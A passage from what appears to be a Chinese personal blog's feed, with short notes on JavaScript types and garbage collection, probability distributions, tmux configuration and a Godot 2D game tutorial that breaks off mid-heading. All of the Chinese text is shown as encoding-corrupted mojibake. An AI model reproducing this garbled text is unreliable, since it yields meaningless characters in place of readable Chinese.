æ­¤ä¹Ÿå°±ä¸èƒ½ç›´æ¥æ“ä½œå¯¹è±¡æ‰€åœ¨çš„å†…å­˜ç©ºé—´ã€‚åœ¨æ“ä½œå¯¹è±¡æ—¶ï¼Œå®é™…ä¸Šæ“ä½œçš„æ˜¯å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨ (reference) è€Œéå®é™…çš„å¯¹è±¡æœ¬èº«.</p><p>åŸå§‹å€¼ (primitive value) æ˜¯æœ€ç®€å•çš„æ•°æ®. (Undefined, Null, Boolean, Number, String å’Œ Symbol)</p><p>å¼•ç”¨å€¼ (reference value) æ˜¯å¯¹å¯¹è±¡çš„å¼•ç”¨.</p><h3 id="4-1-1-åŠ¨æ€å±æ€§"><a href="#4-1-1-åŠ¨æ€å±æ€§" class="headerlink" title="4.1.1 åŠ¨æ€å±æ€§"></a>4.1.1 åŠ¨æ€å±æ€§</h3><p>å¼•ç”¨å€¼å¯ä»¥éšæ—¶æ·»åŠ å±æ€§å’Œæ–¹æ³•. è€ŒåŸå§‹å€¼ä¸èƒ½.</p><h3 id="4-1-2-å¤åˆ¶å€¼"><a href="#4-1-2-å¤åˆ¶å€¼" class="headerlink" title="4.1.2 å¤åˆ¶å€¼"></a>4.1.2 å¤åˆ¶å€¼</h3><p>å¼•ç”¨å€¼å¤åˆ¶çš„å€¼å…¶å®æ˜¯ä¸€ä¸ªæŒ‡é’ˆ, å®ƒæŒ‡å‘å­˜å‚¨åœ¨å †å†…å­˜ä¸­çš„å¯¹è±¡.</p><h3 id="4-1-3-ä¼ é€’å‚æ•°"><a href="#4-1-3-ä¼ é€’å‚æ•°" class="headerlink" title="4.1.3 ä¼ é€’å‚æ•°"></a>4.1.3 ä¼ é€’å‚æ•°</h3><p>æŒ‰å€¼ä¼ é€’.</p><h3 id="4-1-4-ç¡®å®šç±»å‹"><a href="#4-1-4-ç¡®å®šç±»å‹" class="headerlink" title="4.1.4 ç¡®å®šç±»å‹"></a>4.1.4 ç¡®å®šç±»å‹</h3><p>ä½¿ç”¨ <code>instanceof</code> æ“ä½œç¬¦ï¼Œåˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯ä¸æ˜¯æŸä¸ªå¯¹è±¡ç±»å‹:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">result = variable <span class="hljs-keyword">instanceof</span> constructor<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// å˜é‡ person æ˜¯ Object å—?</span><br></code></pre></td></tr></table></figure><h2 id="4-2-æ‰§è¡Œä¸Šä¸‹æ–‡ä¸ä½œç”¨åŸŸ"><a href="#4-2-æ‰§è¡Œä¸Šä¸‹æ–‡ä¸ä½œç”¨åŸŸ" class="headerlink" title="4.2 æ‰§è¡Œä¸Šä¸‹æ–‡ä¸ä½œç”¨åŸŸ"></a>4.2 æ‰§è¡Œä¸Šä¸‹æ–‡ä¸ä½œç”¨åŸŸ</h2><p>æ¯ä¸ªä¸Šä¸‹æ–‡éƒ½æœ‰ä¸€ä¸ªå…³è”çš„ <mark>å˜é‡å¯¹è±¡ (variable object)</mark>, è€Œè¿™ä¸ªä¸Šä¸‹æ–‡ä¸­å®šä¹‰çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°éƒ½å­˜åœ¨äºè¿™ä¸ªå¯¹è±¡ä¸Šã€‚è™½ç„¶æ— æ³•æ˜¯é€šè¿‡ä»£ç è®¿é—®å˜é‡å¯¹è±¡ï¼Œä½†åå°å¤„ç†æ•°æ®ä¼šç”¨åˆ°å®ƒ.</p><h2 id="4-3-åƒåœ¾å›æ”¶"><a href="#4-3-åƒåœ¾å›æ”¶" class="headerlink" title="4.3 åƒåœ¾å›æ”¶"></a>4.3 åƒåœ¾å›æ”¶</h2><p>åƒåœ¾å›æ”¶å°±æ˜¯æ‰§è¡Œç¯å¢ƒè´Ÿè´£åœ¨ä»£ç æ‰§è¡Œæ—¶ç®¡ç†å†…å­˜.</p><p>åŸºæœ¬æ€è·¯å°±æ˜¯: ç¡®å®šå“ªä¸ªå˜é‡ä¸ä¼šå†ä½¿ç”¨ï¼Œç„¶åé‡Šæ”¾å®ƒå ç”¨çš„å†…å­˜. è¿™ä¸ªè¿‡ç¨‹æ˜¯å‘¨æœŸæ€§çš„ï¼Œå³åƒåœ¾å›æ”¶ç¨‹åºæ¯éš”ä¸€å®šæ—¶é—´å°±ä¼šè‡ªåŠ¨è¿è¡Œ.</p><p>åƒåœ¾å›æ”¶ç¨‹åºå¿…é¡»è¿½è¸ªçºªå½•å“ªä¸ªå˜é‡è¿˜ä¼šä½¿ç”¨ï¼Œä¸¤ç§ä¸»è¦çš„æ ‡è®°æ–¹æ³•.</p><h3 id="4-3-1-æ ‡è®°æ¸…ç†-mark-and-sweep"><a href="#4-3-1-æ ‡è®°æ¸…ç†-mark-and-sweep" class="headerlink" title="4.3.1 æ ‡è®°æ¸…ç† (mark-and-sweep)"></a>4.3.1 æ ‡è®°æ¸…ç† (mark-and-sweep)</h3><h3 id="4-3-2-å¼•ç”¨è®¡æ•°-reference-couning"><a href="#4-3-2-å¼•ç”¨è®¡æ•°-reference-couning" class="headerlink" title="4.3.2 å¼•ç”¨è®¡æ•° (reference couning)"></a>4.3.2 å¼•ç”¨è®¡æ•° (reference couning)</h3><p>å¼•ç”¨æ•°ä¸º 0 æ—¶å›æ”¶.</p><h3 id="4-3-3-æ€§èƒ½"><a href="#4-3-3-æ€§èƒ½" class="headerlink" title="4.3.3 æ€§èƒ½"></a>4.3.3 æ€§èƒ½</h3><h3 id="4-3-4-å†…å­˜ç®¡ç†"><a href="#4-3-4-å†…å­˜ç®¡ç†" class="headerlink" title="4.3.4 å†…å­˜ç®¡ç†"></a>4.3.4 å†…å­˜ç®¡ç†</h3><p>å°†å˜é‡è®¾ç½®ä¸º null æ¥é‡Šæ”¾å¼•ç”¨.</p><h1 id="ç¬¬5ç« -åŸºæœ¬å¼•ç”¨ç±»å‹"><a href="#ç¬¬5ç« -åŸºæœ¬å¼•ç”¨ç±»å‹" class="headerlink" title="ç¬¬5ç«  åŸºæœ¬å¼•ç”¨ç±»å‹"></a>ç¬¬5ç«  åŸºæœ¬å¼•ç”¨ç±»å‹</h1><p>å¼•ç”¨ç±»å‹è™½ç„¶æœ‰ç‚¹åƒç±»ï¼Œä½†è·Ÿç±»å¹¶ä¸æ˜¯ä¸€ä¸ªæ¦‚å¿µ.</p><h2 id="5-1-Date"><a href="#5-1-Date" class="headerlink" title="5.1 Date"></a>5.1 Date</h2><p>åˆ›å»ºæ—¥æœŸå¯¹è±¡:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> now = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br></code></pre></td></tr></table></figure><h2 id="5-2-RegExp"><a href="#5-2-RegExp" class="headerlink" title="5.2 RegExp"></a>5.2 RegExp</h2><p>ECMAScript é€šè¿‡ RegExp ç±»å‹æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼. æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨ç±»ä¼¼ Perl çš„ç®€æ´è¯­æ³•æ¥åˆ›å»º:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> expression = <span class="hljs-regexp">/pattern/</span>flags;<br></code></pre></td></tr></table></figure><p><img src="/../img/javascript_regex_flags.png"></p><p>ä¹Ÿå¯ä»¥é€šè¿‡ RegExp æ„é€ å‡½æ•°æ åˆ›å»º:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> pattern = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&quot;[bc]at&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>);<br></code></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•ï¼Œå…ƒå­—ç¬¦éœ€è¦äºŒæ¬¡è½¬ä¹‰.</p><h2 id="5-3-åŸå§‹å€¼åŒ…è£…ç±»å‹"><a href="#5-3-åŸå§‹å€¼åŒ…è£…ç±»å‹" class="headerlink" title="5.3 åŸå§‹å€¼åŒ…è£…ç±»å‹"></a>5.3 åŸå§‹å€¼åŒ…è£…ç±»å‹</h2><h2 id="5-4-å•ä¾‹å†…ç½®å¯¹è±¡"><a href="#5-4-å•ä¾‹å†…ç½®å¯¹è±¡" class="headerlink" title="5.4 å•ä¾‹å†…ç½®å¯¹è±¡"></a>5.4 å•ä¾‹å†…ç½®å¯¹è±¡</h2><p>Global å’Œ Math.</p>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºéšæœºå˜é‡çš„ç†è§£</title>
    <link href="/2022/11/22/%E5%85%B3%E4%BA%8E%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <url>/2022/11/22/%E5%85%B3%E4%BA%8E%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/150295256">å‚è€ƒ</a></p><p>åœ¨æ¦‚ç‡ç»Ÿè®¡ä¸­, éšæœºå˜é‡: å˜é‡ä¸­çš„å€¼æ˜¯éšæœºç°è±¡çš„ç»“æœ.</p><p>æ¯”å¦‚: $P(X&#x3D;3)$</p><p>è¿™é‡Œçš„éšæœºå˜é‡æ˜¯ X, å®ƒçš„å€¼æ˜¯ 3. å˜é‡ X çš„å€¼å…¶å®ä¸ä¸€å®šä¸º 3ï¼Œæ˜¯éšæœºçš„ï¼Œè€Œæˆ‘ä»¬è¦çš„å°±æ˜¯å½“è¿™ä¸ªéšæœºå€¼æ˜¯ 3 æ—¶çš„æ¦‚ç‡.</p><p>éšæœºå˜é‡ä¸åŒäºä»£æ•°ä¸­çš„å˜é‡ï¼Œå› ä¸ºå®ƒå…·æœ‰ä¸€ç»„å®Œæ•´çš„å€¼, å¹¶ä¸”å¯ä»¥éšæœºè·å–ä»»ä½•å€¼ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºæŒ‡æ•°åˆ†å¸ƒçš„ç†è§£</title>
    <link href="/2022/11/22/%E5%85%B3%E4%BA%8E%E6%8C%87%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <url>/2022/11/22/%E5%85%B3%E4%BA%8E%E6%8C%87%E6%95%B0%E5%88%86%E5%B8%83%E7%9A%84%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/354825596/answer/893242882">å‚è€ƒ</a></p><p>æŒ‡æ•°åˆ†å¸ƒè¿™ä¸ªåå­—ï¼Œæ˜¯ç”±äºå…¶åˆ†å¸ƒæ˜¯ $e$ çš„æŒ‡æ•°å€.</p><p>å…³äº â€œæ— è®°å¿†æ€§â€: æœªæ¥æˆ‘è¿˜éœ€è¦ç­‰å¤šé•¿æ—¶é—´ï¼Œè·Ÿæˆ‘å·²ç»ç­‰äº†å¤šé•¿æ—¶é—´æ²¡æœ‰å…³ç³». æ„æ€å°±æ˜¯ä»¥å‰ç­‰äº†å¤šä¹…å’Œä½ è¿˜è¦ç­‰å¤šä¹…æ²¡æœ‰å…³ç³»ã€‚ä¹Ÿæ¯”å¦‚æŠ½å¥–ï¼Œä¸­å¥–çš„æ¦‚ç‡ä¸ä¼šå› ä¸ºä½ æŠ½çš„æ¬¡æ•°å˜å¤šè€Œå˜é«˜.</p><p>$P(X &gt; s|X &gt; t) &#x3D; P(X &gt; s-t), s &gt; t$</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ­£æ€åˆ†å¸ƒåå­—çš„ç”±æ¥</title>
    <link href="/2022/11/22/%E6%AD%A3%E6%80%81%E5%88%86%E5%B8%83%E5%90%8D%E5%AD%97%E7%9A%84%E7%94%B1%E6%9D%A5/"/>
    <url>/2022/11/22/%E6%AD%A3%E6%80%81%E5%88%86%E5%B8%83%E5%90%8D%E5%AD%97%E7%9A%84%E7%94%B1%E6%9D%A5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/128809461">å‚è€ƒ</a></p><p>æ­£æ€åˆ†å¸ƒ (normal distribution). ç”±äºè¿™ç§æ•°æ®åˆ†å¸ƒå¤ªè¿‡äºå¸¸è§ï¼ŒåŸºæœ¬èƒ½æè¿°æ‰€æœ‰å¸¸è§çš„äº‹åŠ¡å’Œç°è±¡ï¼Œå› æ­¤ä¸º normal çš„ distribution.</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç†è§£æ¦‚ç‡å¯†åº¦å‡½æ•°</title>
    <link href="/2022/11/22/%E7%90%86%E8%A7%A3%E6%A6%82%E7%8E%87%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0/"/>
    <url>/2022/11/22/%E7%90%86%E8%A7%A3%E6%A6%82%E7%8E%87%E5%AF%86%E5%BA%A6%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/263467674/answer/1117758894">å‚è€ƒ</a></p><p>å½“æˆ‘ä»¬æ±‚çš„æ¦‚ç‡å¯ä»¥ç”¨ä¸€ä¸ªé¢ç§¯å’Œæ€»é¢ç§¯ä¹‹æ¯”æ±‚å¾—æ—¶ï¼Œæˆ‘ä»¬ç§°è¿™ç§æ–¹æ³•ä¸ºæ¦‚ç‡å¯†åº¦å‡½æ•°.</p><p><img src="/../img/Probability_density_function.png"></p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¸ºä»€ä¹ˆå«å‡ ä½•åˆ†å¸ƒå’Œè¶…å‡ ä½•åˆ†å¸ƒ</title>
    <link href="/2022/11/21/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AB%E5%87%A0%E4%BD%95%E5%88%86%E5%B8%83%E5%92%8C%E8%B6%85%E5%87%A0%E4%BD%95%E5%88%86%E5%B8%83/"/>
    <url>/2022/11/21/%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AB%E5%87%A0%E4%BD%95%E5%88%86%E5%B8%83%E5%92%8C%E8%B6%85%E5%87%A0%E4%BD%95%E5%88%86%E5%B8%83/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/40608734/answer/1275366068">å‚è€ƒ çŸ¥ä¹</a></p><p>ç­‰æ¯”æ•°åˆ—åˆç§°å‡ ä½•æ•°åˆ—. å‡ ä½•åˆ†å¸ƒå°±æ˜¯å„é¡¹æ„æˆç­‰æ¯”æ•°åˆ—.<br>$$<br>P(\xi &#x3D; n) &#x3D; g(g; n) &#x3D; p(1-p)^{n-1} (n \in N^{*})<br>$$</p><p>æŠŠç­‰æ¯”çº§æ•°æ¨å¹¿å¯ä»¥å¾—åˆ°è¶…å‡ ä½•çº§æ•°, å…¶å‰åé¡¹æ¯”æ˜¯ä¸€ä¸ª n çš„æœ‰ç†å‡½æ•°.<br>$$<br>\frac{\beta_{n+1}}{\beta_n} &#x3D; \frac{P(n)}{Q(n)}<br>$$</p><p>è¶…å‡ ä½•å°±æ˜¯æ¨å¹¿çš„å‡ ä½•.</p><p>è¶…å‡ ä½•åˆ†å¸ƒå°±æ˜¯å®ƒçš„åˆ†å¸ƒé¡¹çš„æ¯ä¸€é¡¹æ­£å¥½æ˜¯æŸä¸ªè¶…å‡ ä½•çº§æ•°ä¸­çš„é¡¹.</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯å‡ ä½•</title>
    <link href="/2022/11/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%87%A0%E4%BD%95/"/>
    <url>/2022/11/21/%E4%BB%80%E4%B9%88%E6%98%AF%E5%87%A0%E4%BD%95/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/303558027/answer/947487152">å‚è€ƒ çŸ¥ä¹</a></p><p>å¤§å¤šæ•°ä»¤äººæ„Ÿåˆ°è´¹è§£çš„è¯æ±‡éƒ½æ˜¯ä»å›½å¤–éŸ³è¯‘è¿‡æ¥çš„.</p><p>geometria çš„å¼€å¤´ geo- ä¸å‡ ä½•ç›¸ä¼¼. geometria çš„æ‹‰ä¸å«ä¹‰ä¸ºæµ‹åœ°æ•°.</p>]]></content>
    
    
    <categories>
      
      <category>Math</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Godot-æŠ€å·§ç§¯ç´¯</title>
    <link href="/2022/11/21/Godot-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2022/11/21/Godot-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äºèŠ‚ç‚¹ä¹‹é—´ä¿¡æ¯çš„ä¼ é€’"><a href="#å…³äºèŠ‚ç‚¹ä¹‹é—´ä¿¡æ¯çš„ä¼ é€’" class="headerlink" title="å…³äºèŠ‚ç‚¹ä¹‹é—´ä¿¡æ¯çš„ä¼ é€’"></a>å…³äºèŠ‚ç‚¹ä¹‹é—´ä¿¡æ¯çš„ä¼ é€’</h1><p>çˆ¶èŠ‚ç‚¹ç›´æ¥ä¼ é€’å˜é‡å’Œå­èŠ‚ç‚¹æ²Ÿé€š.</p><p>å­èŠ‚ç‚¹ç”¨ä¿¡å·å’Œçˆ¶èŠ‚ç‚¹æ²Ÿé€š.</p>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tmux-é…ç½®</title>
    <link href="/2022/11/19/tmux-%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/11/19/tmux-%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>å…¶é…ç½®æ–‡ä»¶çš„å†…å®¹å®é™…ä¸Šå°±æ˜¯å‘½ä»¤è¡Œä¸­ <code>tmux + ...</code> çš„å†…å®¹ï¼Œå¯ä»¥åœ¨ manpage ä¸­æŸ¥çœ‹.</p><p><code>set</code> å’Œ <code>set-option</code> ä¼¼ä¹å«ä¹‰ç›¸åŒ. <code>set</code> æ˜¯ <code>set-option</code> çš„ alias.</p><p><code>show</code> æ˜¯ <code>show-options</code> çš„ alias.</p><p><code>bind</code> æ˜¯ <code>bind-key</code> çš„ alias. å°†ä¸€ä¸ªé”®ä½å’Œ tmux å‘½ä»¤ç»‘å®š.</p><p><code>send</code> æ˜¯ <code>send-keys</code> çš„ alias. å’Œ <code>send-prefix</code> éƒ½æ˜¯æ–¹ä¾¿æ²¡æœ‰åˆ‡æ¢åˆ°ä¸€ä¸ª window ä¸Šé¢æ—¶å¯¹å…¶å‘é€æŒ‡ä»¤.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-tmux-é…ç½®æ–‡ä»¶ä¸èµ·ä½œç”¨</title>
    <link href="/2022/11/18/%E5%85%B3%E4%BA%8E-tmux-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/11/18/%E5%85%B3%E4%BA%8E-tmux-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://superuser.com/questions/188491/tmux-disregarding-the-configuration-file">å‚è€ƒ</a></p><p>å…¶åŸå› ä¸ºï¼Œtmux server åœ¨è¿è¡Œå, è¿™æ—¶ä¿®æ”¹ tmux çš„é…ç½®æ–‡ä»¶ï¼Œå…¶å¹¶æ²¡æœ‰è¯»å– (å°±ç®—ä½¿ç”¨ <code>-f</code> é€‰é¡¹).</p><p>éœ€è¦é‡å¯ tmux server.</p><p>å…ˆç”¨ tmux list-sessions åˆ—å‡ºæ‰€æœ‰å·²ç»æ‰“å¼€çš„ sessions, ç”¨ tmux attach è¿æ¥åå°†å…¶å…¨éƒ¨é€€å‡º.</p><p>æˆ–è€…ä½¿ç”¨ <code>killall tmux</code> or <code>tmux kill-server</code> æ¥å…³é—­.</p><p>åœ¨  tmux ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ <code>source-file ~/.tmux.conf</code> æ¥è¯»å–é…ç½®æ–‡ä»¶.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Godot-å®˜æ–¹-2D-æ¸¸æˆåˆ¶ä½œé¡¹ç›®ç¤ºä¾‹</title>
    <link href="/2022/11/18/Godot-%E5%AE%98%E6%96%B9-2D-%E6%B8%B8%E6%88%8F%E5%88%B6%E4%BD%9C%E9%A1%B9%E7%9B%AE%E7%A4%BA%E4%BE%8B/"/>
    <url>/2022/11/18/Godot-%E5%AE%98%E6%96%B9-2D-%E6%B8%B8%E6%88%8F%E5%88%B6%E4%BD%9C%E9%A1%B9%E7%9B%AE%E7%A4%BA%E4%BE%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ-B-ç«™æ•™ç¨‹"><a href="#å‚è€ƒ-B-ç«™æ•™ç¨‹" class="headerlink" title="å‚è€ƒ B ç«™æ•™ç¨‹"></a><a href="https://www.bilibili.com/video/BV1pt411p7DK/?spm_id_from=333.880.my_history.page.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™æ•™ç¨‹</a></h1><h2 id="åœ¨-Godot-ä¸­è¾“å…¥æ±‰å­—"><a href="#åœ¨-Godot-ä¸­è¾“å…¥æ±‰å­—" class="headerlink" title="åœ¨ Godot ä¸­è¾“å…¥æ±‰å­—"></a>åœ¨ Godot ä¸­è¾“å…¥æ±‰å­—</h2><p>é¦–å…ˆå°†å­—ä½“æ–‡ä»¶æ”¾å…¥é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹, ä»¥ label èŠ‚ç‚¹ä¸ºä¾‹ï¼Œåœ¨å³è¾¹æ å¾€ä¸‹æ‹‰:<br><img src="/../img/godot_add_chinese.png"></p><p>åœ¨è¿™ä¸ªåœ°æ–¹é€‰æ‹©ä½ æ·»åŠ è¿›æ¥çš„æ±‰å­—.</p><p>æ³¨æ„è¿˜éœ€æ‰“å¼€ Setting ä¸‹çš„ Use Mipmaps å’Œ Use Filter.</p><h2 id="åˆ›å»º-Player-åœºæ™¯"><a href="#åˆ›å»º-Player-åœºæ™¯" class="headerlink" title="åˆ›å»º Player åœºæ™¯"></a>åˆ›å»º Player åœºæ™¯</h2><p>è°ƒæ•´ Player çš„å¤§å°å¯ä»¥åœ¨å³è¾¹æ  Node2D -&gt; Transform -&gt; Scale ä¸‹è°ƒèŠ‚.</p><p>å…³äºè§’è‰²çš„è´´å›¾ä¸ºä»€ä¹ˆå« Sprite (ç²¾çµ), å› ä¸ºå¦‚æœä¸åŠ ä¸Šç¢°æ’ä½“ï¼Œå®ƒå°±æ˜¯è™šçš„ï¼Œæ— æ³•æ¥è§¦åˆ°ï¼Œæ‰€ä»¥æ˜¯ç²¾çµ.</p><p>é˜²æ­¢å¯¹è§’çº¿é€Ÿåº¦æ˜¯ x, y è½´çš„å åŠ ï¼Œéœ€è¦å…ˆå°†é€Ÿåº¦ normalized.</p><h2 id="åŠ¨ç”»çš„æ’­æ”¾"><a href="#åŠ¨ç”»çš„æ’­æ”¾" class="headerlink" title="åŠ¨ç”»çš„æ’­æ”¾"></a>åŠ¨ç”»çš„æ’­æ”¾</h2><p>åœæ­¢åŠ¨ç”»æœ‰ <code>stop()</code> æ–¹æ³•.</p><p>éœ€è¦è®°ä½ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹çš„å±æ€§éƒ½å¯ä»¥ç”¨ä»£ç ä¿®æ”¹. åŒ…æ‹¬å½“å‰æ’­æ”¾çš„æ˜¯å“ªä¸€ä¸ªåŠ¨ç”».</p><h2 id="è®¾ç½®äº†é€Ÿåº¦ä¹‹åè¿˜éœ€è¦æ›´æ–°ä½ç½®-position"><a href="#è®¾ç½®äº†é€Ÿåº¦ä¹‹åè¿˜éœ€è¦æ›´æ–°ä½ç½®-position" class="headerlink" title="è®¾ç½®äº†é€Ÿåº¦ä¹‹åè¿˜éœ€è¦æ›´æ–°ä½ç½® position"></a>è®¾ç½®äº†é€Ÿåº¦ä¹‹åè¿˜éœ€è¦æ›´æ–°ä½ç½® position</h2><h2 id="è®¾ç½®ç¢°æ’ä½“"><a href="#è®¾ç½®ç¢°æ’ä½“" class="headerlink" title="è®¾ç½®ç¢°æ’ä½“"></a>è®¾ç½®ç¢°æ’ä½“</h2><p>å¯ä»¥åœ¨ä»£ç ä¸­ç›´æ¥å…³æ‰ç¢°æ’çš„æ£€æµ‹. ç”¨ <code>disabled</code> å±æ€§.</p><h2 id="è®¾ç½®æ•Œäºº"><a href="#è®¾ç½®æ•Œäºº" class="headerlink" title="è®¾ç½®æ•Œäºº"></a>è®¾ç½®æ•Œäºº</h2><p>ä¸€èˆ¬æ¥è¯´ï¼ŒKinematicBody2D ä¸€èˆ¬ç”¨ä½œ Player, è€Œ RigidBody2D ä¸€èˆ¬ç”¨ä½œæ•Œäºº.</p><p>æŠŠ RigidBody2D ä¸­å³è¾¹æ  Gravity Scale è°ƒä¸º 0ï¼Œå°±ä¸ä¼šè‡ªåŠ¨å¾€ä¸‹æ‰.</p><p>æ•Œäººçš„éšæœºçŠ¶æ€åˆ©ç”¨éšæœºæ•°æ¥å¤„ç†.</p><p>å¯ä»¥å…ˆç”¨ <code>animation</code> å±æ€§æ¥ç¡®å®šæ’­æ”¾å“ªä¸€ä¸ªåŠ¨ç”»ï¼Œå†ä½¿ç”¨ <code>play()</code> æ–¹æ³•æ¥æ’­æ”¾.</p><p>VisibilityNotifier2D è¿™ä¸ªèŠ‚ç‚¹æœ‰ä¸€ä¸ªä¿¡å·ï¼Œå¯ä»¥è®©ç‰©ä½“åœ¨ç¦»å¼€å±å¹•æ—¶è§¦å‘. å…¶æè¿°å°±æ˜¯ â€œDetects approximately when the node is visible on screen.â€</p><h2 id="è®¾ç½®ä¸»ä¸–ç•Œ"><a href="#è®¾ç½®ä¸»ä¸–ç•Œ" class="headerlink" title="è®¾ç½®ä¸»ä¸–ç•Œ"></a>è®¾ç½®ä¸»ä¸–ç•Œ</h2><p>åˆ©ç”¨ Timer èŠ‚ç‚¹æ¥æ§åˆ¶æ•Œäººçš„ç”Ÿæˆ, æ¸¸æˆå¼€å§‹æ—¶çš„å€’è®¡æ—¶, ä»¥åŠåˆ†æ•°è®¡æ•°.</p><p>ç”¨ Position2D èŠ‚ç‚¹æ¥è®¾å®š Player çš„åˆå§‹ä½ç½®. å…¶æè¿°ä¸º â€œItâ€™s just like a plain Node2D, but it displays as a cross in the 2D editor at all times.â€ ä¹Ÿå°±æ˜¯è¯´å’Œ Node2D æ˜¯ä¸€æ ·çš„.</p><p>åˆ©ç”¨ Path2D å’Œ PathFollow2D æ¥ä¸ºæ•Œäººçš„ç”Ÿæˆè®¾å®šåˆå§‹ç‚¹. å…¶åˆ©ç”¨éšæœºæ•°åœ¨ PathFollow2D å¯¹ Path2D çš„ offset ä¸Šéšæœºå–ä¸€ä¸ªç‚¹ï¼Œç„¶åä»è¿™ä¸ªç‚¹ç”Ÿæˆæ•Œäºº.</p><p><code>PI</code> è¡¨ç¤º $\pi$</p><p>æ•Œäººæ˜¯ RigidBody2Dï¼Œå› æ­¤å¯ä»¥ç›´æ¥åœ¨ä»£ç ä¸­è®¾ç½®çº¿æ€§é€Ÿåº¦.</p><p>ä¸€èˆ¬æ·»åŠ  UI æ”¾åœ¨ CanvasItem èŠ‚ç‚¹ä¸‹.</p><h2 id="æ·»åŠ èƒŒæ™¯"><a href="#æ·»åŠ èƒŒæ™¯" class="headerlink" title="æ·»åŠ èƒŒæ™¯"></a>æ·»åŠ èƒŒæ™¯</h2><p>ä½¿ç”¨ ColorRect èŠ‚ç‚¹. ç„¶ååœ¨ Layout ä¸­é€‰æ‹© Full Rect è‡ªåŠ¨é“ºæ»¡.</p><h2 id="æ·»åŠ éŸ³æ•ˆ"><a href="#æ·»åŠ éŸ³æ•ˆ" class="headerlink" title="æ·»åŠ éŸ³æ•ˆ"></a>æ·»åŠ éŸ³æ•ˆ</h2><p>ä½¿ç”¨ AudioStreamPlayer èŠ‚ç‚¹.</p><p>Godot ä¸æ”¯æŒ Mp3 æ ¼å¼ï¼Œç”¨ Wav å’Œ Ogg æ ¼å¼.</p><h2 id="æ·»åŠ ç²’å­ç‰¹æ•ˆ"><a href="#æ·»åŠ ç²’å­ç‰¹æ•ˆ" class="headerlink" title="æ·»åŠ 